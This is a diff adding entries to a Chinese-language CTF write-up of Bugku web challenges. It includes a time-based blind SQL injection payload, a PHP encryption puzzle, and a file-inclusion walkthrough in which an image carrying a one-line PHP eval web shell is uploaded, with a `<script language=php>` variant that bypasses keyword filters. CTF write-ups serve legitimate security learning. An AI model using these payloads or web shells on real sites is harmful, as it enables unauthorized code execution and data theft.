@@ -547,3 +547,67 @@
   4. 一个个猜测表名称的字符内容。
 
   `1' and (select case when (select ('§a§'=substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from §1§ for 1))) then sleep(5) else 1 end)  and '1'='1`
+
+  最后就可以拿到flag了
+
+37. PHP_encrypt_1(ISCCCTF)
+
+  太难了。
+  需要照着一个加密函数，写出对应的解密函数。
+  ```
+  function encrypt($data,$key)
+{
+    $key = md5('ISCC');
+    $x = 0;
+    $len = strlen($data);
+    $klen = strlen($key);
+    for ($i=0; $i < $len; $i++) {
+        if ($x == $klen)
+        {
+            $x = 0;
+        }
+        $char .= $key[$x];
+        $x+=1;
+    }
+    for ($i=0; $i < $len; $i++) {
+        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
+    }
+    return base64_encode($str);
+}
+?>
+#output:fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=
+  ```
+
+38. 文件包含2
+
+  ![文件包含2](../../imgs/Bugku/Web/gnome-shell-screenshot-ASAI5Z.png)
+
+  从URL中可以看到文件包含方式是`?file=hello.php`，用这个格式使用dirb跑一下,根据不同页面返回内容大小，得到一个关键页面`upload.php`
+
+  ![文件包含2](../../imgs/Bugku/Web/gnome-shell-screenshot-FUSG5Z.png)
+
+  打开页面发现是一个上传页面。
+
+  ![文件包含2](../../imgs/Bugku/Web/gnome-shell-screenshot-63584Z.png)
+
+  先用老方法抓包改内容改后缀,但是页面提示只能上传规定的后缀文件，测试了几种后缀都不行，判断应该是一个白名单限制。
+
+  ![文件包含2](../../imgs/Bugku/Web/gnome-shell-screenshot-YZS84Z.png)
+
+  不过没关系，因为是文件包含，所以包含了含有一句话木马的图片也是可以执行(网上好多方法是改后缀名成`a.php;.jpg`,明显是蠢得不知道问题所在乱说一气)。我们按照原来的图片格式上传。
+
+  ![文件包含2](../../imgs/Bugku/Web/gnome-shell-screenshot-TIVO5Z.png)
+
+  先用文件包含的方式访问一下这个图片地址`http://123.206.31.85:49166/index.php?file=upload/201907230226053601.png`。如果我们的一句话木马成功了是不会有内容的，但是我们看到一些关键词被过滤了。
+
+  ![文件包含2](../../imgs/Bugku/Web/gnome-shell-screenshot-AGLG5Z.png)
+
+  这时候问题就变为如何绕过过滤，然后发现可以把一句话木马修改成`<script language=php>@eval($_POST['cmd']);</script>`再次上传
+
+  ![文件包含2](../../imgs/Bugku/Web/gnome-shell-screenshot-ULKH5Z.png)
+
+  直接访问这个页面，没有任何内容显示，估计成功。于是发包phpinfo();尝试(不喜欢用菜刀)，成功!
+
+  ![文件包含2](../../imgs/Bugku/Web/gnome-shell-screenshot-DE2D5Z.png)
+
+  然后这个页面目录下有一个flag文件，查看后拿到flag，就不赘述。
